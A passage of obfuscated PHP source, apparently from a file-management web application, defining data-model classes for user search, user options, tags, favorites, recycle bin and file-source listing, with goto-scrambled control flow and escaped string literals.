$D©ªğóñÆÇ = $CªíÙ¬‰Ğ[$a‡‘³ÌÌ[2177]]; $cÚÎ ïÍš = isset($CªíÙ¬‰Ğ[$a‡‘³ÌÌ[2178]]) ? $CªíÙ¬‰Ğ[$a‡‘³ÌÌ[2178]] : !1; goto CîÛå—Ğ¯¿; CîÛå—Ğ¯¿: $D©ªğóñÆÇ = str_replace($a‡‘³ÌÌ[2179], $a‡‘³ÌÌ[2180], trim($D©ªğóñÆÇ)); $B¥¹–¸‹¢á = array($a‡‘³ÌÌ[28] => array($a‡‘³ÌÌ[751], "\x25{$D©ªğóñÆÇ}\45"), $a‡‘³ÌÌ[293] => array($a‡‘³ÌÌ[751], "\x25{$D©ªğóñÆÇ}\45"), $a‡‘³ÌÌ[2331] => array($a‡‘³ÌÌ[751], "\45{$D©ªğóñÆÇ}\x25"), $a‡‘³ÌÌ[908] => $a‡‘³ÌÌ[2181]); if (Input::check($D©ªğóñÆÇ, $a‡‘³ÌÌ[299])) { $B¥¹–¸‹¢á[$a‡‘³ÌÌ[1431]] = array($a‡‘³ÌÌ[751], "\x25{$D©ªğóñÆÇ}\45"); $B¥¹–¸‹¢á[$a‡‘³ÌÌ[2509]] = array($a‡‘³ÌÌ[751], "\45{$D©ªğóñÆÇ}\x25"); } goto CÍøâÉŠˆö; CÍøâÉŠˆö: if (!$D©ªğóñÆÇ) { $B¥¹–¸‹¢á = array(); } if (isset($CªíÙ¬‰Ğ[$a‡‘³ÌÌ[688]])) { $B¥¹–¸‹¢á[$a‡‘³ÌÌ[688]] = $CªíÙ¬‰Ğ[$a‡‘³ÌÌ[688]]; } $eà•˜ôê« = $this->_makeOrder()->where($B¥¹–¸‹¢á)->selectPage(20); goto b¥À–æ‹ç; B›Øì©Ó•Ì: } private function _filterByGroup(&$e˜´ÌˆÙîæ, $bÖ¸ÏäàÀ™) { $aˆŠÚÊæÌç =& $_SERVER[îÖ]; if (!$bÖ¸ÏäàÀ™) { return $e˜´ÌˆÙîæ; } foreach ($e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[354]] as $A‚öÖ¯†áã => &$bŒÈÀÔø•) { $D‘¿Š¯§» = array_to_keyvalue($bŒÈÀÔø•[$aˆŠÚÊæÌç[2529]], $aˆŠÚÊæÌç[33], $aˆŠÚÊæÌç[2099]); if (!in_array($bÖ¸ÏäàÀ™, $D‘¿Š¯§»)) { unset($e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[354]][$A‚öÖ¯†áã]); } } $e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[354]] = array_values($e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[354]]); $e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[351]] = array($aˆŠÚÊæÌç[2307] => count($e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[354]]), $aˆŠÚÊæÌç[2305] => $e˜´ÌˆÙîæ[$aˆŠÚÊæÌç[351]][$aˆŠÚÊæÌç[349]], $aˆŠÚÊæÌç[2304] => 1, $aˆŠÚÊæÌç[2306] => 1); } private function _searchFromMeta($cÉ®¾½ÔÌ½, $dÒ·Ğ²»ñù, $a°‰Àñ) { goto B˜Ä‰«“£‡; B˜Ä‰«“£‡: $bó»ÔØä¥ =& $_SERVER[îÖ]; $dÒ·Ğ²»ñù = strtolower($dÒ·Ğ²»ñù); $d­îá…÷«À = array($bó»ÔØä¥[89] => $cÉ®¾½ÔÌ½, $bó»ÔØä¥[359] => array($bó»ÔØä¥[751], "\45{$dÒ·Ğ²»ñù}\45")); goto aÀ™„ŒİãÍ; b£ÆÄ–à‚: $a™ÁÍÜÊò¥ = $this->where(array($bó»ÔØä¥[1422] => array($bó»ÔØä¥[7], $EÌèöà—®ñ)))->select(); if (!$a™ÁÍÜÊò¥) { return array(); } return $a™ÁÍÜÊò¥; goto d¸›ˆ§ì†; aÀ™„ŒİãÍ: $EÌèöà—®ñ = Model($bó»ÔØä¥[2530])->where($d­îá…÷«À)->limit($a°‰Àñ)->select(); if (!$EÌèöà—®ñ) { return array(); } $EÌèöà—®ñ = array_to_keyvalue($EÌèöà—®ñ, $bó»ÔØä¥[33], $bó»ÔØä¥[1431]); goto b£ÆÄ–à‚; d¸›ˆ§ì†: } private function _listDataApplyItem($eì¾´›Ââ‰) { $a³Ü ‚É“¢ = array($eì¾´›Ââ‰); $this->_listDataApply($a³Ü ‚É“¢); return $a³Ü ‚É“¢[0]; } private function _listDataApply(&$dÇµˆÏº) { goto b¸î£¿Ã‹; dÖ‘í»×ë¬: $eã”¢…é«¤ = array_to_keyvalue($dÇµˆÏº, $Eè®˜‚šçœ[33], $Eè®˜‚šçœ[1431]); $this->_listAppendGroup($dÇµˆÏº, $eã”¢…é«¤); $this->_listAppendMeta($dÇµˆÏº, $eã”¢…é«¤); goto F‰ôŠÕÄ¥“; F‰ôŠÕÄ¥“: $this->_listAppendSourceRoot($dÇµˆÏº, $eã”¢…é«¤); goto CéÜÖöŠ–À; b¸î£¿Ã‹: $Eè®˜‚šçœ =& $_SERVER[îÖ]; if (!$dÇµˆÏº) { return; } array_remove_key($dÇµˆÏº, $Eè®˜‚šçœ[796]); goto dÖ‘í»×ë¬; CéÜÖöŠ–À: } private function _listAppendSourceRoot(&$A†ÏÓÚâÏß, $BŞÑ‘ËÙÒ‚) { goto dŸƒ«•„¥; dŸƒ«•„¥: $F‡½˜â‚Ø÷ =& $_SERVER[îÖ]; $Fæ¾¿éèĞ¶ = array($F‡½˜â‚Ø÷[461] => 0, $F‡½˜â‚Ø÷[371] => SourceModel::TYPE_USER, $F‡½˜â‚Ø÷[456] => array($F‡½˜â‚Ø÷[7], $BŞÑ‘ËÙÒ‚)); $aàé½»ÅÙ› = $F‡½˜â‚Ø÷[2188]; goto aÄÖ¶é¬ª°; aÄÖ¶é¬ª°: $D¾á£«ã‰Ä = Model($F‡½˜â‚Ø÷[752])->order($F‡½˜â‚Ø÷[2189])->field($aàé½»ÅÙ›)->where($Fæ¾¿éèĞ¶)->select(); $D¾á£«ã‰Ä = array_to_keyvalue($D¾á£«ã‰Ä, $F‡½˜â‚Ø÷[456]); $D¾á£«ã‰Ä = array_remove_key($D¾á£«ã‰Ä, $F‡½˜â‚Ø÷[456]); goto b©ñó’§æ; b©ñó’§æ: foreach ($A†ÏÓÚâÏß as &$E»¿–ñä³) { $E»¿–ñä³[$F‡½˜â‚Ø÷[391]] = $D¾á£«ã‰Ä[$E»¿–ñä³[$F‡½˜â‚Ø÷[1431]]] ? $D¾á£«ã‰Ä[$E»¿–ñä³[$F‡½˜â‚Ø÷[1431]]] : array(); } goto AÇ‚òœ‚Â; AÇ‚òœ‚Â: } private function _listAppendGroup(&$b ÆãŒÛ…•, $eÎ·æ‹Ùƒ±) { goto eÓì«Ñª ©; eÓì«Ñª ©: $eŠÈŸ¯®Å² =& $_SERVER[îÖ]; $fÎÆ˜¸Û¯ = array($eŠÈŸ¯®Å²[1431] => array($eŠÈŸ¯®Å²[7], $eÎ·æ‹Ùƒ±)); $AÁÁ·ÍºŒ = Model($eŠÈŸ¯®Å²[2175])->where($fÎÆ˜¸Û¯)->select(); goto B½é’Û„â”; FÒ†¬…–•»: $fÎÆ˜¸Û¯ = array($eŠÈŸ¯®Å²[2099] => array($eŠÈŸ¯®Å²[7], $EÁë­É¡¨)); $F”¯Ï¬İÉ = Model($eŠÈŸ¯®Å²[2531])->field($eŠÈŸ¯®Å²[2532])->where($fÎÆ˜¸Û¯)->select(); $EÉ¸°ƒ˜Š = array_to_keyvalue($F”¯Ï¬İÉ, $eŠÈŸ¯®Å²[2099], $eŠÈŸ¯®Å²[28]); goto eé¼”ä¼²; eé¼”ä¼²: $AÁÁ·ÍºŒ = array_to_keyvalue_group($AÁÁ·ÍºŒ, $eŠÈŸ¯®Å²[1431]); foreach ($AÁÁ·ÍºŒ as &$BàÃŒ¶¬Ï²) { $aç¾’´Ë Ğ = array(); foreach ($BàÃŒ¶¬Ï² as $b›ÇÓ¢ÒĞÂ) { if (!$b›ÇÓ¢ÒĞÂ[$eŠÈŸ¯®Å²[2230]]) { continue; } $a­Ô‹ÌâÂ˜ = Model($eŠÈŸ¯®Å²[2249])->listData($b›ÇÓ¢ÒĞÂ[$eŠÈŸ¯®Å²[2230]]); $aç¾’´Ë Ğ[] = array($eŠÈŸ¯®Å²[2099] => $b›ÇÓ¢ÒĞÂ[$eŠÈŸ¯®Å²[2099]], $eŠÈŸ¯®Å²[2533] => $EÉ¸°ƒ˜Š[$b›ÇÓ¢ÒĞÂ[$eŠÈŸ¯®Å²[2099]]], $eŠÈŸ¯®Å²[376] => $a­Ô‹ÌâÂ˜); } $BàÃŒ¶¬Ï² = $aç¾’´Ë Ğ; } foreach ($b ÆãŒÛ…• as &$f½²¦ÚÇõ”) { $f½²¦ÚÇõ”[$eŠÈŸ¯®Å²[2529]] = array(); if (isset($AÁÁ·ÍºŒ[$f½²¦ÚÇõ”[$eŠÈŸ¯®Å²[1431]]])) { $f½²¦ÚÇõ”[$eŠÈŸ¯®Å²[2529]] = $AÁÁ·ÍºŒ[$f½²¦ÚÇõ”[$eŠÈŸ¯®Å²[1431]]]; } } goto b¥„Ÿ«“í; B½é’Û„â”: $EÁë­É¡¨ = array_to_keyvalue($AÁÁ·ÍºŒ, $eŠÈŸ¯®Å²[33], $eŠÈŸ¯®Å²[2099]); $EÁë­É¡¨ = array_remove_value(array_unique($EÁë­É¡¨), $eŠÈŸ¯®Å²[468]); if (!$EÁë­É¡¨ || !$AÁÁ·ÍºŒ) { return; } goto FÒ†¬…–•»; b¥„Ÿ«“í: } private function _listAppendMeta(&$D×áĞèÓ‡, $cíâÌ“½¨ç) { goto b¤æ›»¥×; Bİè«‡İ“º: $Eİã‡²ã˜Œ = array($B²ù¯ø [1431] => array($B²ù¯ø [7], $cíâÌ“½¨ç)); $EÊ›ŒÒ„ƒ = Model($B²ù¯ø [2508])->where($Eİã‡²ã˜Œ)->select(); $EÊ›ŒÒ„ƒ = array_to_keyvalue_group($EÊ›ŒÒ„ƒ, $B²ù¯ø [1431]); goto E‹Óë¬³¥Š; b¤æ›»¥×: $B²ù¯ø  =& $_SERVER[îÖ]; $d—¦Å™õ¸ = UserJobModel::JOB_KEY; $D»¸®ÙôÎÆ = array($B²ù¯ø [2511]); goto Bİè«‡İ“º; E‹Óë¬³¥Š: foreach ($EÊ›ŒÒ„ƒ as &$D–Ò—Ê‡–Ù) { $E¸ßÖ‹Ê†´ = array(); foreach ($D–Ò—Ê‡–Ù as $e¡áÂÖÆ£è) { if (!in_array($e¡áÂÖÆ£è[$B²ù¯ø [89]], $D»¸®ÙôÎÆ)) { $E¸ßÖ‹Ê†´[$e¡áÂÖÆ£è[$B²ù¯ø [89]]] = $e¡áÂÖÆ£è[$B²ù¯ø [359]]; } } $D–Ò—Ê‡–Ù = $E¸ßÖ‹Ê†´; } $cí¡êê©„˜ = Model($B²ù¯ø [2534]); foreach ($D×áĞèÓ‡ as &$AŸé£Ó–) { $eÕµŸ°½È« = array(); if (isset($EÊ›ŒÒ„ƒ[$AŸé£Ó–[$B²ù¯ø [1431]]])) { $eÕµŸ°½È« = $EÊ›ŒÒ„ƒ[$AŸé£Ó–[$B²ù¯ø [1431]]]; } $AŸé£Ó–[$B²ù¯ø [2535]] = array(); if (isset($eÕµŸ°½È«[$d—¦Å™õ¸])) { $AŸé£Ó–[$B²ù¯ø [2535]] = $cí¡êê©„˜->getUserJobInfo($eÕµŸ°½È«[$d—¦Å™õ¸]); } } goto F¿ÔöèÓåæ; F¿ÔöèÓåæ: } protected function groupUserAll($B¾ë´ÆÛ‘›) { $eêã¸å¹‡† =& $_SERVER[îÖ]; if (!$B¾ë´ÆÛ‘›) { return !1; } $EĞËĞåÒğŠ = Model($eêã¸å¹‡†[2175])->field($eêã¸å¹‡†[1431])->where(array($eêã¸å¹‡†[2099] => array($eêã¸å¹‡†[7], $B¾ë´ÆÛ‘›)))->select(); $EĞËĞåÒğŠ = array_to_keyvalue($EĞËĞåÒğŠ, $eêã¸å¹‡†[33], $eêã¸å¹‡†[1431]); return array_unique($EĞËĞåÒğŠ); } public function userSearch($EŠÂ¢Ö‰£î, $B¹“ùŸáË = "\52") { return Model($_SERVER[îÖ][477])->where($EŠÂ¢Ö‰£î)->field($B¹“ùŸáË)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($D¿öº—ÛÀ) { $b‘æËÌñ‹· =& $_SERVER[îÖ]; if (!defined($b‘æËÌñ‹·[427])) { define($b‘æËÌñ‹·[427], 0); } return "\x55\163\145\162\117\x70\164\x69\157\x6e\137{$D¿öº—ÛÀ}\137" . USER_ID; } protected function filterWhere($b²‘øŸ‘Ã¿) { $c‡¥âš®»† =& $_SERVER[îÖ]; if (!defined($c‡¥âš®»†[427])) { define($c‡¥âš®»†[427], 0); } $b²‘øŸ‘Ã¿[$c‡¥âš®»†[1431]] = USER_ID; return $b²‘øŸ‘Ã¿; } public function cacheRemoveUser($e£Ô”µ­òë, $DÇÒêˆÉ«) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\164\151\x6f\156\137{$e£Ô”µ­òë}\x5f" . $DÇÒêˆÉ«); } protected function optionDefault($Aóâ™·ƒ¾ = '') { $a£Øâå†Ğ =& $_SERVER[îÖ]; if ($Aóâ™·ƒ¾ == $a£Øâå†Ğ[33]) { return $GLOBALS[$a£Øâå†Ğ[6]][$a£Øâå†Ğ[2536]]; } if ($Aóâ™·ƒ¾ == $a£Øâå†Ğ[2537]) { return $GLOBALS[$a£Øâå†Ğ[6]][$a£Øâå†Ğ[2538]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\164\141\x67\x4c\x69\163\x74"; public $modelType = "\125\163\145\x72\117\160\164\151\x6f\156"; public $field = array("\156\x61\155\145", "\x73\164\x79\154\145", "\x73\x6f\162\x74"); public function listData($f¹Ï¤îÓ© = false, $fº„º÷©Ã = "\163\157\x72\x74", $Eˆ·àßó— = false) { return parent::listData($f¹Ï¤îÓ©, $fº„º÷©Ã, $Eˆ·àßó—); } public function remove($F•š¦‚Û‹) { return parent::remove($F•š¦‚Û‹); } public function add($eÀ¼ê«×ë, $Eœ›¼½…‚é = "\154\x61\142\145\154\55\x67\162\x65\171\55\156\157\x72\x6d\x61\x6c") { $b®öÜ´¦¶ =& $_SERVER[îÖ]; if ($this->findByName($eÀ¼ê«×ë)) { return !1; } $e’Ö µåç© = array($b®öÜ´¦¶[386] => $eÀ¼ê«×ë, $b®öÜ´¦¶[437] => $Eœ›¼½…‚é, $b®öÜ´¦¶[2103] => $this->getSort($b®öÜ´¦¶[246]) + 1); return parent::insert($e’Ö µåç©); } public function update($eŸ­ÜÂôİ‚, $DÄÚ½‚à¦) { $Fö–¬ŸÇ¾ =& $_SERVER[îÖ]; $aá¤éÚ•ïÒ = $this->listData($eŸ­ÜÂôİ‚); $cáº¨ê = $this->findByName($DÄÚ½‚à¦[$Fö–¬ŸÇ¾[28]]); if (!$aá¤éÚ•ïÒ || $cáº¨ê && $cáº¨ê[$Fö–¬ŸÇ¾[367]] != $aá¤éÚ•ïÒ[$Fö–¬ŸÇ¾[367]]) { return !1; } return parent::update($eŸ­ÜÂôİ‚, $DÄÚ½‚à¦); } public function moveTop($bÀçºÀîĞ) { $c±„‘Ï–Ó =& $_SERVER[îÖ]; $aÊ¥Ù¾Œª = parent::listData(); $f¤Ÿ¡½…Ë = $this->getSort($c±„‘Ï–Ó[245]); foreach ($aÊ¥Ù¾Œª as &$dí•…—Èñ) { if ($dí•…—Èñ[$c±„‘Ï–Ó[367]] == $bÀçºÀîĞ) { $dí•…—Èñ[$c±„‘Ï–Ó[2120]] = $f¤Ÿ¡½…Ë; continue; } $dí•…—Èñ[$c±„‘Ï–Ó[2120]] += 1; } return parent::resetData($aÊ¥Ù¾Œª); } public function moveBottom($bÉÂğÛ·ºÏ) { $AØçÉÏˆà‚ =& $_SERVER[îÖ]; $aäøöÙ‚çõ = $this->getSort($AØçÉÏˆà‚[246]) + 1; return parent::update($bÉÂğÛ·ºÏ, array($AØçÉÏˆà‚[2120] => $aäøöÙ‚çõ)); } public function resetSort($FÖˆˆßÌ«”) { goto Cõïµ“„ßÍ; eªãˆÎ¢Ò: return parent::resetData($Eù®ßª‹Œ­); goto bïˆ˜ ÜÈÇ; F…§¦•í: for ($f„éÅñâµ³ = 0; $f„éÅñâµ³ < count($FÖˆˆßÌ«”); $f„éÅñâµ³++) { $DÑ÷±¼ëÙ[$FÖˆˆßÌ«”[$f„éÅñâµ³] . $EåƒØ˜¼Ù´[33]] = $f„éÅñâµ³ + 1; } $Eù®ßª‹Œ­ = parent::listData(); foreach ($Eù®ßª‹Œ­ as &$B÷±Ù´„öœ) { $aïÕ¤Œ¢À‰ = $DÑ÷±¼ëÙ[$B÷±Ù´„öœ[$EåƒØ˜¼Ù´[367]]]; $B÷±Ù´„öœ[$EåƒØ˜¼Ù´[2120]] = $aïÕ¤Œ¢À‰ ? $aïÕ¤Œ¢À‰ : $B÷±Ù´„öœ[$EåƒØ˜¼Ù´[2120]]; } goto eªãˆÎ¢Ò; Cõïµ“„ßÍ: $EåƒØ˜¼Ù´ =& $_SERVER[îÖ]; $DÑ÷±¼ëÙ = array(); $FÖˆˆßÌ«” = is_array($FÖˆˆßÌ«”) ? $FÖˆˆßÌ«” : array(); goto F…§¦•í; bïˆ˜ ÜÈÇ: } private function getSort($Fìß›‰ÇÖ) { $DŞÚ¸È£ç¾ =& $_SERVER[îÖ]; $Eï÷Âôùøà = parent::listData(); $Fêôî†Ç´Ä = array_to_keyvalue($Eï÷Âôùøà, $DŞÚ¸È£ç¾[33], $DŞÚ¸È£ç¾[2120]); if (!$Fêôî†Ç´Ä) { $Fêôî†Ç´Ä = array(0); } $eĞ†ÌÚ¨¢ƒ = $Fìß›‰ÇÖ == $DŞÚ¸È£ç¾[246] ? max($Fêôî†Ç´Ä) : min($Fêôî†Ç´Ä); return intval($eĞ†ÌÚ¨¢ƒ); } } goto c–ªÃµšéÏ; Dìœ…Â‡Æ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\154\145\116\x61\x6d\145" => "\151\x6f\x5f\163\x6f\x75\162\143\145\137\155\145\x74\x61", "\155\x65\x74\x61\106\151\145\x6c\144" => "\163\x6f\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\x65\x72\164", "\146\165\156\x63\x74\151\x6f\156"), array("\143\162\x65\141\x74\x65\x54\151\155\145", "\164\151\155\145", "\151\x6e\163\145\162\x74", "\146\x75\156\x63\164\151\x6f\156"), array("\x76\x69\x65\167\124\151\x6d\145", "\164\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\x66\165\x6e\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b”äÉ½Ãô) { return $this->listSource(array($_SERVER[îÖ][368] => $b”äÉ½Ãô)); } public function typeName($fœƒ¹Ä÷ò) { static $EµÓ‚¼‰ö = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $EµÓ‚¼‰ö[$fœƒ¹Ä÷ò . $_SERVER[îÖ][33]]; } public function sourceListInfo($f÷Ìöè‘š, $dâ¹âÏ®ÃÂ = false) { goto f§ÁœÈŠ ; d˜„¶ªÅ°œ: return array_to_keyvalue($bç¿Áã²ßã, $dÓ»˜’Ä…[369]); goto CÒ¹ˆ¦Íùï; f§ÁœÈŠ : $dÓ»˜’Ä… =& $_SERVER[îÖ]; $f÷Ìöè‘š = $f÷Ìöè‘š ? $f÷Ìöè‘š : array(); $f÷Ìöè‘š = array_filter(array_unique($f÷Ìöè‘š)); goto FÚĞÌæÏÕĞ; FÚĞÌæÏÕĞ: if (!$f÷Ìöè‘š) { return array(); } $bç¿Áã²ßã = $this->where(array($dÓ»˜’Ä…[369] => array($dÓ»˜’Ä…[7], $f÷Ìöè‘š)))->select(); $this->_listDataApply($bç¿Áã²ßã, $dâ¹âÏ®ÃÂ); goto d˜„¶ªÅ°œ; CÒ¹ˆ¦Íùï: } public function pathInfoFilter($eÊãªìÆ¼) { goto Aâ‘¯ğÌ‰¥; fæî§¼Åø™: if (isset($eÊãªìÆ¼[$f®êÖó˜ˆÉ[376]]) && $eÊãªìÆ¼[$f®êÖó˜ˆÉ[376]][$f®êÖó˜ˆÉ[377]] == -1) { $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[187]); $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[107]); $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[378]); $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[379]); $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[77]); $aŸ½ì¢º‘Ç = array_remove_value($aŸ½ì¢º‘Ç, $f®êÖó˜ˆÉ[380]); } $eÊãªìÆ¼ = array_field_key($eÊãªìÆ¼, $aŸ½ì¢º‘Ç); return $eÊãªìÆ¼; goto e—÷¥¯Şô; fÁÁ”á¥: $cÕ„ÜÎÃÍ¾ .= $f®êÖó˜ˆÉ[374]; $cÕ„ÜÎÃÍ¾ .= $f®êÖó˜ˆÉ[375]; $aŸ½ì¢º‘Ç = explode($f®êÖó˜ˆÉ[47], $cÕ„ÜÎÃÍ¾); goto fæî§¼Åø™; Aâ‘¯ğÌ‰¥: $f®êÖó˜ˆÉ =& $_SERVER[îÖ]; $eÊãªìÆ¼[$f®êÖó˜ˆÉ[75]] = KodIO::make($eÊãªìÆ¼[$f®êÖó˜ˆÉ[369]]); $eÊãªìÆ¼[$f®êÖó˜ˆÉ[29]] = $eÊãªìÆ¼[$f®êÖó˜ˆÉ[370]] == 1 ? $f®êÖó˜ˆÉ[76] : $f®êÖó˜ˆÉ[167]; goto e²‘æ øŞˆ; e²‘æ øŞˆ: $eÊãªìÆ¼[$f®êÖó˜ˆÉ[371]] = $this->typeName($eÊãªìÆ¼[$f®êÖó˜ˆÉ[371]]); if ($eÊãªìÆ¼[$f®êÖó˜ˆÉ[370]] != 1) { $eÊãªìÆ¼[$f®êÖó˜ˆÉ[160]] = $eÊãªìÆ¼[$f®êÖó˜ˆÉ[372]]; unset($eÊãªìÆ¼[$f®êÖó˜ˆÉ[372]]); } $cÕ„ÜÎÃÍ¾ = $f®êÖó˜ˆÉ[373]; goto fÁÁ”á¥; e—÷¥¯Şô: } public function listUserFav() { goto a‚“¿éÃæÑ; fáÙùº‹¨³: foreach ($E‚ŸÛ—’†® as &$A²ñèàñ»´) { $A²ñèàñ»´ = array($Eíè¶Å‡Á[385] => $A²ñèàñ»´[$Eíè¶Å‡Á[367]], $Eíè¶Å‡Á[386] => $A²ñèàñ»´[$Eíè¶Å‡Á[28]], $Eíè¶Å‡Á[387] => $A²ñèàñ»´[$Eíè¶Å‡Á[75]], $Eíè¶Å‡Á[388] => $A²ñèàñ»´[$Eíè¶Å‡Á[29]], $Eíè¶Å‡Á[389] => $A²ñèàñ»´[$Eíè¶Å‡Á[187]], $Eíè¶Å‡Á[390] => $A²ñèàñ»´[$Eíè¶Å‡Á[107]]); if ($A²ñèàñ»´[$Eíè¶Å‡Á[29]] == $Eíè¶Å‡Á[382] && $DŸÖÏç†Ø[$A²ñèàñ»´[$Eíè¶Å‡Á[75]]]) { $A²ñèàñ»´[$Eíè¶Å‡Á[391]] = $DŸÖÏç†Ø[$A²ñèàñ»´[$Eíè¶Å‡Á[75]]]; } } return $E‚ŸÛ—’†®; goto Bœ“¯í´Ü; d¾»ä·’äŸ: $aâ‰Éâ†ä• = array_to_keyvalue($aâ‰Éâ†ä•, $Eíè¶Å‡Á[33], $Eíè¶Å‡Á[75]); if ($aâ‰Éâ†ä•) { $DŸÖÏç†Ø = $this->listSource(array($Eíè¶Å‡Á[383] => array($Eíè¶Å‡Á[384], $aâ‰Éâ†ä•))); } $DŸÖÏç†Ø = array_to_keyvalue($DŸÖÏç†Ø[$Eíè¶Å‡Á[354]], $Eíè¶Å‡Á[369]); goto fáÙùº‹¨³; a‚“¿éÃæÑ: $Eíè¶Å‡Á =& $_SERVER[îÖ]; $E‚ŸÛ—’†® = Model($Eíè¶Å‡Á[381])->listData(); $aâ‰Éâ†ä• = array_filter_by_field($E‚ŸÛ—’†®, $Eíè¶Å‡Á[29], $Eíè¶Å‡Á[382]); goto d¾»ä·’äŸ; Bœ“¯í´Ü: } public function listUserTag($F×ŒÂ•Œ·‰) { goto EŒ§‘Ø‰‰ø; EŒ§‘Ø‰‰ø: $bšĞ©‡¤Ç‘ =& $_SERVER[îÖ]; $FŒÍ†î×† = Model($bšĞ©‡¤Ç‘[392])->listData(); $c·•ñƒ¡ˆê = array_filter_by_field($FŒÍ†î×†, $bšĞ©‡¤Ç‘[393], $F×ŒÂ•Œ·‰); goto dµô«Åì; dµô«Åì: $c·•ñƒ¡ˆê = array_to_keyvalue($c·•ñƒ¡ˆê, $bšĞ©‡¤Ç‘[33], $bšĞ©‡¤Ç‘[75]); $E‹ì¦¿ÓÜ¤ = array(); if ($c·•ñƒ¡ˆê) { $cŒ½’¾ëø½ = array($bšĞ©‡¤Ç‘[383] => array($bšĞ©‡¤Ç‘[384], $c·•ñƒ¡ˆê)); $E‹ì¦¿ÓÜ¤ = $this->listSource($cŒ½’¾ëø½); } goto cá‡ˆ²Ì; cá‡ˆ²Ì: $this->listUserTagClear($c·•ñƒ¡ˆê, $E‹ì¦¿ÓÜ¤, $F×ŒÂ•Œ·‰); return $E‹ì¦¿ÓÜ¤; goto BíŸ‚œ«ò; BíŸ‚œ«ò: } private function listUserTagClear($F½ì™™ÃÑ, $c’¨‡´¼å, $eùèäŒŠ„) { goto b…‹ë°‘ø¬; D†‰ï»„ª: $D½íÇ×ê»— = array(); $d‹¾çæ·² = array_to_keyvalue($c’¨‡´¼å[$eê‘Û—È²æ[74]], $eê‘Û—È²æ[33], $eê‘Û—È²æ[369]); $Dù¥¢ƒ‚Æ = array_to_keyvalue($c’¨‡´¼å[$eê‘Û—È²æ[73]], $eê‘Û—È²æ[33], $eê‘Û—È²æ[369]); goto Aº‘·ôãâÁ; fµ¸Ã®½®: Model($eê‘Û—È²æ[394])->removeFromTag($D½íÇ×ê»—, $eùèäŒŠ„); goto d×Ç—¬­“À; Aº‘·ôãâÁ: $D„ˆŠö¨ì = array_merge($Dù¥¢ƒ‚Æ, $d‹¾çæ·²); foreach ($F½ì™™ÃÑ as $eİ†–³· µ) { if (!in_array($eİ†–³· µ, $D„ˆŠö¨ì)) { $D½íÇ×ê»—[] = $eİ†–³· µ; } } if (!$D½íÇ×ê»—) { return; } goto fµ¸Ã®½®; b…‹ë°‘ø¬: $eê‘Û—È²æ =& $_SERVER[îÖ]; if (!$F½ì™™ÃÑ) { return; } if ($c’¨‡´¼å && count($F½ì™™ÃÑ) == $c’¨‡´¼å[$eê‘Û—È²æ[351]][$eê‘Û—È²æ[352]]) { return; } goto D†‰ï»„ª; d×Ç—¬­“À: } public function listUserRecycle() { $d¿ƒçš¾Ê³ =& $_SERVER[îÖ]; $eØÒÃÖÕ¤­ = Model($d¿ƒçš¾Ê³[395])->listData(); if (!$eØÒÃÖÕ¤­) { return array(); } $cÛ·°»Ã£õ = array($d¿ƒçš¾Ê³[383] => array($d¿ƒçš¾Ê³[384], $eØÒÃÖÕ¤­), $d¿ƒçš¾Ê³[396] => 1); return $this->listSource($cÛ·°»Ã£õ); } public function listSource($A­õÕ”ó´†, $e½Ú‡á× = 3000) { goto dÀˆÔ–ğ©ì; A™õ³õ„µ²: $BÄå—‹È¥œ = $this->field($E®éÈƒ±â)->_makeOrder()->where($A­õÕ”ó´†)->selectPage($e½Ú‡á×); $this->_listDataApply($BÄå—‹È¥œ[$câÃ‰Ëò¥«[354]]); $this->_listMake($BÄå—‹È¥œ); goto bÌ—ºà†Òæ; dÀˆÔ–ğ©ì: $câÃ‰Ëò¥« =& $_SERVER[îÖ]; if (!isset($A­õÕ”ó´†[$câÃ‰Ëò¥«[397]])) { $A­õÕ”ó´†[$câÃ‰Ëò¥«[397]] = 0; } $E®éÈƒ±â = $câÃ‰Ëò¥«[398]; goto A™õ³õ„µ²; bÌ—ºà†Òæ: return $BÄå—‹È¥œ; goto cœĞš®Ø¿ì; cœĞš®Ø¿ì: } protected function _makeOrder() { goto E„ŞŞ¥‹í; cª¦î×¦¾: if ($CÏ‹ŠÑƒÄ¿ == $dƒÖß¤Æ‚Ğ[28]) { } $f“Œ²Á—¤ = $dƒÖß¤Æ‚Ğ[409] . $dÒÒäòç½ù[$CÏ‹ŠÑƒÄ¿] . $dƒÖß¤Æ‚Ğ[50] . $aæ³ÎáÊ¿½[$f—Ä ¾¥œ¬]; return $this->order(rtrim(trim($f“Œ²Á—¤), $dƒÖß¤Æ‚Ğ[47])); goto FÏÉŞ°£·Â; eµÑóõ¥†Û: $aæ³ÎáÊ¿½ = array($dƒÖß¤Æ‚Ğ[402] => $dƒÖß¤Æ‚Ğ[403], $dƒÖß¤Æ‚Ğ[404] => 